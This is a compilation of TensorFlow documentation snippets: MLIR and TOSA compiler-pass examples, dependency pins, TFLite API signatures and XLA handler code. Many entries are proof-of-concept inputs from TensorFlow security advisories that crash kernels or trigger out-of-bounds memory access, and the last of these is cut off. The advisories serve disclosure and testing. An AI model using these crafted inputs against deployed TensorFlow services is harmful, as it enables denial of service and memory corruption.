CODE:
```
h5py ~= 3.10.0  # Earliest version for Python 3.12
```

LANGUAGE: Python
CODE:
```
ml_dtypes ~= 0.5.1
```

LANGUAGE: Python
CODE:
```
opt_einsum ~= 3.3.0
```

LANGUAGE: Python
CODE:
```
protobuf ~= 3.20.3  # NOTE: Earliest version for Python 3.10
```

LANGUAGE: Python
CODE:
```
six ~= 1.16.0
```

LANGUAGE: Python
CODE:
```
termcolor ~= 2.1.1
```

LANGUAGE: Python
CODE:
```
typing_extensions ~= 4.8.0
```

LANGUAGE: Python
CODE:
```
wheel ~= 0.41.2
```

LANGUAGE: Python
CODE:
```
wrapt ~= 1.14.1
```

----------------------------------------

TITLE: Marking Unsupported Ops for Outside Compilation MLIR TensorFlow
DESCRIPTION: Demonstrates how the -tf-mark-ops-for-outside-compilation pass identifies operations unsupported on a device within a tf_device.cluster and marks them with the _xla_outside_compilation attribute. The first block shows an unsupported op before the pass, and the second shows the op with the added attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_32

LANGUAGE: MLIR
CODE:
```
func @unsupported_op() -> tensor<i32> {
  %0 = "tf_device.cluster"() ( {
    %1 = "tf.UnsupportedOp"() : () -> tensor<i32>
    %2 = "tf.Identity"(%1) : (tensor<i32>) -> tensor<i32>
    tf_device.return %2 : tensor<i32>
  }) {allow_soft_placement = true, num_cores_per_replica = 1, topology =  "", device_assignment =  []} : () -> tensor<i32>
  return %0 : tensor<i32>
}
```

LANGUAGE: MLIR
CODE:
```
func @unsupported_op() -> tensor<i32> {
  %0 = "tf_device.cluster"() ( {
    %1 = "tf.UnsupportedOp"() {_xla_outside_compilation = "auto0"} : () -> tensor<i32>
    %2 = "tf.Identity"(%1) : (tensor<i32>) -> tensor<i32>
    tf_device.return %2 : tensor<i32>
  }) {allow_soft_placement = true, device_assignment = [], num_cores_per_replica = 1 : i64, topology = ""} : () -> tensor<i32>
  return %0 : tensor<i32>
}
```

----------------------------------------

TITLE: Triggering DoS in SparseTensorToCSRSparseMatrix Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.SparseTensorToCSRSparseMatrix` by providing crafted inputs. The `indices` and `dense_shape` tensors are intentionally given shapes that violate the expected sparse tensor structure, causing a crash in the underlying C++ kernel due to missing validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-068.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

indices = tf.constant(53, shape=[3], dtype=tf.int64)
values = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)
dense_shape = tf.constant(53, shape=[3], dtype=tf.int64)

tf.raw_ops.SparseTensorToCSRSparseMatrix(
  indices=indices,
  values=values,
  dense_shape=dense_shape)
```

----------------------------------------

TITLE: Checking Control Dependencies in TF Executor MLIR
DESCRIPTION: This snippet demonstrates an MLIR function with `tf_executor.graph` containing sequential `tf.AssignVariableOp` operations separated by `tf.NoOp` islands. The `-tf-executor-check-control-dependencies` pass analyzes such paths to identify control dependencies between ops that don't have natural data or side-effect dependencies, highlighting potential conservatism in the graph execution order.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_8

LANGUAGE: MLIR
CODE:
```
func.func @path_with_intermediate_ops(
  %arg0: tensor<!tf_type.resource<tensor<f32>>>,
  %arg1: tensor<!tf_type.resource<tensor<f32>>>,
  %arg2: tensor<f32>) -> () {
  tf_executor.graph {
    %island1 = tf_executor.island wraps "tf.AssignVariableOp"(%arg0, %arg2) : (tensor<!tf_type.resource<tensor<f32>>>, tensor<f32>) -> ()
    %island2 = tf_executor.island(%island1) wraps "tf.NoOp"() : () -> ()
    %island3 = tf_executor.island(%island2) wraps "tf.NoOp"() : () -> ()
    %island4 = tf_executor.island(%island3) wraps "tf.AssignVariableOp"(%arg1, %arg2) : (tensor<!tf_type.resource<tensor<f32>>>, tensor<f32>) -> ()
    tf_executor.fetch
  }
  func.return
}
```

----------------------------------------

TITLE: Lowering DepthToSpace (MLIR/TOSA IR)
DESCRIPTION: Lowers a DepthToSpace operation to TOSA, assuming NHWC data format. It first reshapes the input tensor to a 6D shape, then transposes dimensions to interleave the block size, and finally reshapes to the final output shape. This sequence of operations effectively rearranges data from the depth dimension into spatial dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_6

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_depth_to_space_op(Value %input, size_t block_size[], Format_t data_format)
{
    assert(data_format == 'NHWC')

    vector <size_t> a2_shape = {%input.shape[0],
                                %input.shape[1],
                                %input.shape[2],
                                block_size[0],
                                block_size[1],
                                %input.shape[3] / (block_size[0] * block_size[1])}

    vector <size_t> a4_shape = {%input.shape[0],
                                %input.shape[1] * block_size[0],
                                %input.shape[2] * block_size[1],
                                %input.shape[3] / (block_size[0] * block_size[1])}

    %a2_reshape = tosa.RESHAPE(%input) {new_shape=a2_shape}
    %a3_transpose = tosa.TRANSPOSE(%a2_reshape) {perms={0, 1, 3, 2, 4, 5}}
    %output = tosa.RESHAPE(%a3_transpose) {new_shape=a4_shape}

    return %output
}
```

----------------------------------------

TITLE: Initialize BoundingBoxProperties FlatBuffer Object Python
DESCRIPTION: Initializes the `BoundingBoxProperties` object with a FlatBuffer buffer and its position. This method prepares the object to access data from the provided buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_8

LANGUAGE: Python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Triggering MaxPooling3D Crash with Invalid Pool Size in TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates a vulnerability in `tf.keras.layers.MaxPooling3D` where a `pool_size` containing a zero dimension causes a crash (segfault). It initializes a `MaxPooling3D` layer with `pool_size=[2, 2, 0]` and applies it to a random tensor, which triggers the unintended behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-199.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

pool_size = [2, 2, 0]
layer = tf.keras.layers.MaxPooling3D(strides=1, pool_size=pool_size)
input_tensor = tf.random.uniform([3, 4, 10, 11, 12], dtype=tf.float32)
res = layer(input_tensor)
```

----------------------------------------

TITLE: Vulnerable C++ Code for SparseTensorToCSRSparseMatrix Overflow
DESCRIPTION: This C++ snippet shows the exact line in the TensorFlow kernel where the heap buffer overflow vulnerability exists. The expression `indices(i, 0) + 1` can result in an index outside the bounds of the `csr_row_ptr` array, leading to an out-of-bounds write when attempting to increment the value at that location.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-033.md#_snippet_1

LANGUAGE: c++
CODE:
```
csr_row_ptr(indices(i, 0) + 1) += 1;
```

----------------------------------------

TITLE: Reproducing SparseMatrixNNZ CHECK Fail (Python)
DESCRIPTION: This snippet demonstrates how to reproduce the `CHECK` fail vulnerability in `tf.raw_ops.SparseMatrixNNZ`. It calls the operation with an invalid input `sparse_matrix` argument, specifically an empty list `[]`, which has a rank 0 shape and is not interpreted as a valid matrix, leading to the reported issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-164.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.SparseMatrixNNZ(sparse_matrix=[])
```

----------------------------------------

TITLE: Calling TensorFlow Binary Operation Functor in C++
DESCRIPTION: This C++ snippet shows the call to a templated binary functor within a TensorFlow kernel. The vulnerability arises when the template types `Tin` and `Tout` do not match the actual data types of the input and output tensors (`out`, `input_0`, `input_1`), causing the `flat<*>` method to misinterpret the underlying data, potentially leading to a `CHECK` failure and denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-046.md#_snippet_0

LANGUAGE: C++
CODE:
```
functor::BinaryFunctor<Device, Functor, 1>()(
    eigen_device, out->template flat<Tout>(),
    input_0.template flat<Tin>(), input_1.template flat<Tin>(),
    error_ptr);
```

----------------------------------------

TITLE: Demonstrating FakeQuantWithMinMaxVarsPerChannel Vulnerability in TensorFlow
DESCRIPTION: This Python snippet demonstrates the denial-of-service vulnerability in TensorFlow's `tf.raw_ops.FakeQuantWithMinMaxVarsPerChannel` operation. It shows how providing `min` and `max` tensors with incorrect shapes (specifically, rank other than 1 for `min`) triggers a `CHECK` fail, leading to a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-106.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

num_bits = 8
narrow_range = False
inputs = tf.constant(0, shape=[4], dtype=tf.float32)
min = tf.constant([], shape=[4,0,0], dtype=tf.float32)
max = tf.constant(0, shape=[4], dtype=tf.float32)
tf.raw_ops.FakeQuantWithMinMaxVarsPerChannel(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)
```

----------------------------------------

TITLE: Demonstrating QuantizeAndDequantizeV2 Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2023-002 vulnerability in TensorFlow's `QuantizeAndDequantizeV2` operation. It calls the function with a large, out-of-bounds value for the `axis` parameter (0x7fffffff), which triggers a heap out-of-buffer read, potentially leading to a crash or RCE. This requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-002.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
    							   input_min=[1.0],
    							   input_max=[10.0],
    							   signed_input=True,
    							   num_bits=1,
    							   range_given=True,
    							   round_mode='HALF_TO_EVEN',
    							   narrow_range=True,
    							   axis=0x7fffffff)
test()
```

----------------------------------------

TITLE: Initializing from Packed Buffer (Python)
DESCRIPTION: Initializes the `ScoreCalibrationOptionsT` object from a packed buffer, with an optional starting position. This class method is likely used for deserializing data from a more compact buffer format. Requires the packed buffer (`buf`) and an optional starting position (`pos`), which defaults to 0.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Triggering Division by 0 in QuantizedAdd (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in `tf.raw_ops.QuantizedAdd`. By providing the second input tensor `y` with a shape containing a dimension of size zero (e.g., `shape=[2, 0]`), the internal calculation of `vector_num_elements` becomes zero, leading to a runtime division by zero error in the modulo operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-037.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

x = tf.constant([68, 228], shape=[2, 1], dtype=tf.quint8)
y = tf.constant([], shape=[2, 0], dtype=tf.quint8)

min_x = tf.constant(10.723421015884028)
max_x = tf.constant(15.19578006631113)
min_y = tf.constant(-5.539003866682977)
max_y = tf.constant(42.18819949559947)

tf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```

----------------------------------------

TITLE: Demonstrating Heap OOB in TensorFlow UnicodeEncode Python
DESCRIPTION: This Python snippet demonstrates the vulnerable call to `tf.raw_ops.UnicodeEncode` using crafted input tensors (`input_values`, `input_splits`) that trigger the heap out-of-bounds access described in the security advisory. It highlights how specific invalid sparse tensor representations can be used for exploitation. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-047.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_values = tf.constant([58], shape=[1], dtype=tf.int32)
input_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)
output_encoding = "UTF-8"

tf.raw_ops.UnicodeEncode(
    input_values=input_values, input_splits=input_splits,
    output_encoding=output_encoding)
```

----------------------------------------

TITLE: Demonstrating FusedResizeAndPadConv2D Overflow Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in `tf.raw_ops.FusedResizeAndPadConv2D` by providing exceptionally large values for the `size` parameter. The large size values (1879048192) trigger the overflow within the operation's internal calculations, leading to unexpected behavior or a crash. It requires the TensorFlow library to run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-147.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

mode = "REFLECT"
strides = [1, 1, 1, 1]
padding = "SAME"
resize_align_corners = False
input = tf.constant(147, shape=[3,3,1,1], dtype=tf.float16)
size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
paddings = tf.constant([3,4], shape=[2], dtype=tf.int32)
filter = tf.constant(123, shape=[1,3,4,1], dtype=tf.float16)
tf.raw_ops.FusedResizeAndPadConv2D(input=input, size=size, paddings=paddings, filter=filter, mode=mode, strides=strides, padding=padding, resize_align_corners=resize_align_corners)
```

----------------------------------------

TITLE: Example MLIR After Tensor List Decomposition (TF Dialect)
DESCRIPTION: Shows the MLIR code after the tensor list decomposition pass is applied. Tensor list operations are replaced by standard tensor operations like `tf.BroadcastTo`, `tf.Reshape`, `tf.ConcatV2`, `tf.XlaDynamicUpdateSlice`, and `tf.AddV2`, operating on a single large buffer tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_45

LANGUAGE: MLIR
CODE:
```
func @main(%arg0: tensor<8x4xf32>) {
  // EmptyTensorList lowering
  %emptyi = "tf.Const"() {value = dense<0> : tensor<i32>} : () -> tensor<i32>
  %emptyf = "tf.Cast"(%emptyi) : (tensor<i32>) -> tensor<f32>
  %size_shape = "tf.Const"() {value = dense<[10, 8, 4]> : tensor<3xi32>} : () -> tensor<3xi32>
  %tl = "tf.BroadcastTo"(%emptyf, %size_shape) : (tensor<f32>, tensor<3xi32>) -> tensor<10x8x4xf32>
  // TensorListPushBack lowering
  %index_in_list = "tf.Const"() {value = dense<0> : tensor<1xi32>} : () -> tensor<1xi32>
  %arg0_shape = "tf.Const"() {value = dense<[1, 8, 4]> : tensor<3xi32>} : () -> tensor<3xi32>
  %arg0_reshaped = "tf.Reshape"(%arg0, %arg0_shape) : (tensor<8x4xf32>, tensor<3xi32>) -> tensor<1x8x4xf32>
  %zeroi2 = "tf.Const"() {value = dense<0> : tensor<2xi32>} : () -> tensor<2xi32>
  %axis = "tf.Const"() {value = dense<0> : tensor<i32>} : () -> tensor<i32>
  %start_indices = "tf.ConcatV2"(%index_in_list, %zeroi2, %axis) : (tensor<1xi32>, tensor<2xi32>, tensor<i32>) -> tensor<3xi32>
  %push = "tf.XlaDynamicUpdateSlice"(%tl, %arg0_reshaped, %start_indices) : (tensor<10x8x4xf32>, tensor<1x8x4xf32>, tensor<3xi32>) -> tensor<10x8x4xf32>
  %one = "tf.Const"() {value = dense<1> : tensor<1xi32>} : () -> tensor<1xi32>
  %next_index_in_list = "tf.AddV2"(%index_in_list, %one) : (tensor<1xi32>, tensor<1xi32>) -> tensor<1xi32>
  return
}
```

----------------------------------------

TITLE: Registering DynamicStitch Op (C++)
DESCRIPTION: This C++ code snippet shows the registration of the `DynamicStitch` TensorFlow operation. It defines the expected inputs (`indices` and `data` with count `N`), the output (`merged`), attributes (`N` and `T`), and the shape function. The vulnerability arises when the actual number of `indices` and `data` inputs provided at runtime does not match the expected `N`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-145.md#_snippet_0

LANGUAGE: C++
CODE:
```
REGISTER_OP("DynamicStitch")
    .Input("indices: N * int32")
    .Input("data: N * T")
    .Output("merged: T")
    .Attr("N : int >= 1")
    .Attr("T : type")
    .SetShapeFn(DynamicStitchShapeFunction);
```

----------------------------------------

TITLE: Binding XLA FFI Handler for Variadic Arguments/Results
DESCRIPTION: Demonstrates creating an XLA FFI handler that can accept a variable number of arguments and results using `RemainingArgs` and `RemainingRets`. Arguments and results are accessed at runtime by index and type using `get<T>(index)`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_5

LANGUAGE: C++
CODE:
```
auto handler = Ffi::Bind().RemainingArgs().RemainingRets().To(
    [](RemainingArgs args, RemainingRets results) -> Error {
      ErrorOr<AnyBuffer> arg = args.get<AnyBuffer>(0);
      ErrorOr<Result<AnyBuffer>> res = results.get<AnyBuffer>(0);

      if (!arg.has_value()) {
        return Error(ErrorCode::kInternal, arg.error());
      }

      if (!res.has_value()) {
        return Error(ErrorCode::kInternal, res.error());
      }

      return Error::Success();
    });
```

----------------------------------------

TITLE: Demonstrating QuantizeAndDequantizeV2 Vulnerability in Python
DESCRIPTION: This Python proof-of-concept snippet demonstrates how a negative `axis` value (-100) can trigger a heap out-of-bounds read vulnerability in the `tf.raw_ops.QuantizeAndDequantizeV2` operation within a TensorFlow function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-185.md#_snippet_3

LANGUAGE: Python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV2(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100)
  return data

test()
```

----------------------------------------

TITLE: Defining XLA FFI Handlers for Status
DESCRIPTION: Demonstrates how to define simple XLA FFI handlers using `Ffi::Bind().To()` that return either an error status with a code and message or a success status. Custom call implementations must return `xla::ffi::Error`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_0

LANGUAGE: C++
CODE:
```
// Handler that always returns an error.
auto always_error = Ffi::Bind().To(
    []() { return Error(ErrorCode::kInternal, "Oops!"); });

// Handler that always returns a success.
auto always_success = Ffi::Bind().To(
    []() { return Error::Success(); });
```

----------------------------------------

TITLE: Running XLA HLO Pass Pipeline C++
DESCRIPTION: This snippet shows the basic usage of `HloPassPipeline` in C++. It demonstrates creating a pipeline, adding individual passes and passes wrapped with `HloPassFix` for repeated application, and finally executing the pipeline on a target `HloModule`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/hlo/pass/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
// Create a pipeline
HloPassPipeline pipeline("my_pipeline");

// Add passes to the pipeline
pipeline.AddPass<SomeOptimizationPass>(/* pass arguments */);
pipeline.AddPass<HloPassFix<AnotherOptimizationPass>>(/* pass arguments */);

// Run the pipeline on an HloModule
HloModule module(/* ... */);
auto status = pipeline.Run(&module);
```

----------------------------------------

TITLE: Specifying input/output aliasing in an HLO module (MLIR)
DESCRIPTION: Modifies the 'increment' HLO module definition in MLIR to include the `input_output_alias` attribute. The attribute `{}: 0` specifies that the entire output shape (`{}`) should be aliased to input parameter at index `0`. This enables potential in-place computation if the input buffer is donated at runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/aliasing.md#_snippet_1

LANGUAGE: mlir
CODE:
```
HloModule increment, input_output_alias={ {}: 0 }

ENTRY entry {
  %p = f32[] parameter(0)
  %c = f32[] constant(1)
  ROOT %out = f32[] add(%p, %c)
}
```

----------------------------------------

TITLE: Defining portpicker Dependency
DESCRIPTION: Specifies the exact version (1.6.0) for the 'portpicker' package and includes multiple SHA256 hashes. This entry defines the required version of the utility for picking a free network port and ensures its integrity during installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_13

LANGUAGE: Python Requirements
CODE:
```
portpicker==1.6.0 \
    --hash=sha256:b2787a41404cf7edbe29b07b9e0ed863b09f2665dcc01c1eb0c2261c1e7d0755 \
    --hash=sha256:bd507fd6f96f65ee02781f2e674e9dc6c99bbfa6e3c39992e3916204c9d431fa
```

----------------------------------------

TITLE: Lowering Squeeze Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a squeeze operation to the TOSA dialect by reshaping the input tensor. It determines the new shape by removing dimensions of size 1, either all such dimensions if no specific dimensions are provided, or only the specified dimensions if they are of size 1. It then uses the TOSA RESHAPE operation to achieve the squeezing effect.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_26

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_squeeze_op(Value %input, vector<size_t> squeeze_dims)
{
    vector <size_t> reshape_dims

    if (squeeze_dims.size() == 0) {
       // Remove all 1-dims
       for (int32 i = 0; i < %input.rank; i++) {
           if (%input.shape[i] != 1) {
              reshape_dims.push_back(%input_shape[i])
           }
       }
    } else {
      // Remove the specified dimensions
      for (int32 i = 0; i < %input.rank; i++) {
          if (!squeeze_dims.find(i) || %input.shape[i] != -1) {
              reshape_dims.push_back(%input_shape[i])
          }
      }
    }

    %output = tosa.RESHAPE(%input) {new_shape=reshape_dims}

    return %output
}
```

----------------------------------------

TITLE: Accessing CustomMetadata Data Element in Python
DESCRIPTION: Accesses a specific byte or element at index `j` within the binary data buffer associated with the `CustomMetadata` object. This method provides direct access to the raw data bytes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_1

LANGUAGE: python
CODE:
```
Data(
    j
)
```

----------------------------------------

TITLE: Initializing AssociatedFile Object Instance (Python)
DESCRIPTION: Initializes an existing `AssociatedFile` object instance with the data from a specific buffer (`buf`) at a particular position (`pos`). This method is typically called internally after obtaining a buffer segment corresponding to an `AssociatedFile`. It configures the object to access data from the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_4

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Triggering SparseDenseCwiseDiv Integer Overflow in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in `tf.raw_ops.SparseDenseCwiseDiv`. It shows how providing extremely large values (like 92233720368) in the `sp_shape` parameter can trigger unexpected behavior, potentially leading to large memory allocations (OOM) or assertion failures when TensorFlow attempts to build a `TensorShape` with these dimensions. It requires TensorFlow and NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-011.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseDenseCwiseDiv(
    sp_indices=np.array([[9]]),
    sp_values=np.array([5]),
    sp_shape=np.array([92233720368., 92233720368]),
    dense=np.array([4]))
```

----------------------------------------

TITLE: Getting Min Values Length in Python
DESCRIPTION: This instance method returns the number of minimum values stored in the statistical data. It indicates the size of the list or array containing the min values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_10

LANGUAGE: Python
CODE:
```
MinLength()
```

----------------------------------------

TITLE: Initializing ProcessUnit Instance Python
DESCRIPTION: Initializes a `ProcessUnit` instance using a FlatBuffers buffer and a specific position within that buffer. This method is typically used internally after navigating to a `ProcessUnit` within a larger FlatBuffers structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnit.md#_snippet_2

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: MLIR Before Sharding Identification
DESCRIPTION: This MLIR snippet shows a `tf_device.cluster_func` wrapping a function `@func` containing a `tf.XlaSharding` op, before the `-tf-tpu-sharding-identification` pass. The sharding information is present inside the function body but not exposed on the `cluster_func`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_69

LANGUAGE: mlir
CODE:
```
  func @test(%arg0: tensor<*xi32>) {
    "tf_device.cluster_func"(%arg0) {
        func = @func,
        step_marker_location = ""} : (tensor<*xi32>) -> tensor<*xi32>
    return
  }

  func @func(%arg0: tensor<*xi32>) -> tensor<*xi32> {
    %0 = "tf.XlaSharding"(%arg0) {_XlaSharding = "\01\02\03",
                                  sharding = "\01\02\03"} : (tensor<*xi32>) -> tensor<*xi32>
    %1 = "tf.A"(%0) : (tensor<*xi32>) -> (tensor<*xi32>)
    return %1 : tensor<*xi32>
  }
```

----------------------------------------

TITLE: Excluding Profiler Logger Source CMake
DESCRIPTION: Removes the `tensorflow_profiler_logger.cc` source file from the `TFLITE_SRCS` list using a regular expression. This step excludes the TensorFlow profiler logging functionality from being included in the TensorFlow Lite library build.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_25

LANGUAGE: CMake
CODE:
```
# Exclude tensorflow_profiler_logger files.
list(FILTER TFLITE_SRCS EXCLUDE REGEX ".*tensorflow_profiler_logger\\.cc$")
```

----------------------------------------

TITLE: Reproducing SparseSparseMaximum NPE in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the Null Pointer Exception (NPE) vulnerability (TFSA-2023-006, CVE-2023-25665) in `tf.raw_ops.SparseSparseMaximum` by providing invalid sparse tensor inputs. Specifically, using an empty indices list for the second sparse tensor (`b_indices=[[]]`) alongside other valid-looking parameters leads to the crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-006.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.SparseSparseMaximum(
 a_indices=[[1]],
 a_values =[ 0.1 ],
 a_shape = [2],
 b_indices=[[]],
 b_values =[2 ],
 b_shape = [2],
)
```

----------------------------------------

TITLE: Installing clang-tidy on Ubuntu Bash
DESCRIPTION: Provides the command to install the `clang-tidy` static analysis tool on a Debian/Ubuntu-based system using `apt-get`. This tool is used for checking C/C++ code style conformance. Requires root privileges or `sudo`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_0

LANGUAGE: Bash
CODE:
```
apt-get install -y clang-tidy
```

----------------------------------------

TITLE: Initializing ProcessUnitT From Buffer Python
DESCRIPTION: This class method initializes a `ProcessUnitT` object directly from a byte buffer containing serialized FlatBuffers data. It requires the buffer (`buf`) and an optional starting position (`pos`) within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Calling ImagePropertiesStart Function in Python
DESCRIPTION: Provides the function signature for `ImagePropertiesStart` within the `tflite_support.metadata_schema_py_generated` module. This function is called when starting to build a FlatBuffer object representing image properties, requiring a FlatBuffer builder instance as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImagePropertiesStart(
    builder
)
```

----------------------------------------

TITLE: Triggering TensorFlow ParallelConcat FPE Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the Floating Point Exception (FPE) vulnerability in TensorFlow's `tf.raw_ops.ParallelConcat` operation. By calling the operation with the `shape` parameter set to 0, it exploits a missing input validation check that results in a division by zero. This requires a vulnerable version of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-186.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)
  return y

test()
```

----------------------------------------

TITLE: Running TensorFlowLite Bazel Tests Shell
DESCRIPTION: Executes the test suite associated with the TensorFlow Lite Objective-C library target using the Bazel test command.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_7

LANGUAGE: shell
CODE:
```
bazel test tensorflow/lite/objc:tests
```

----------------------------------------

TITLE: Demonstrating TFLite Gather OOB Vulnerability in Python
DESCRIPTION: This Python script serves as a proof-of-concept to demonstrate the heap out-of-bounds read vulnerability in TFLite's `Gather` operation. It constructs a simple TensorFlow v1 graph with a `tf.gather` op, converts it to a TFLite model, and then uses the TFLite interpreter to execute it with a crafted negative index input, which triggers the bug in vulnerable versions. Requires TensorFlow and NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-161.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np
tf.compat.v1.disable_v2_behavior()

params = tf.compat.v1.placeholder(name="params", dtype=tf.int64, shape=(1,))
indices = tf.compat.v1.placeholder(name="indices", dtype=tf.int64, shape=())

out = tf.gather(params, indices, name='out')

with tf.compat.v1.Session() as sess:
   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])
   tflite_model = converter.convert()

interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()

input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()

params_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))
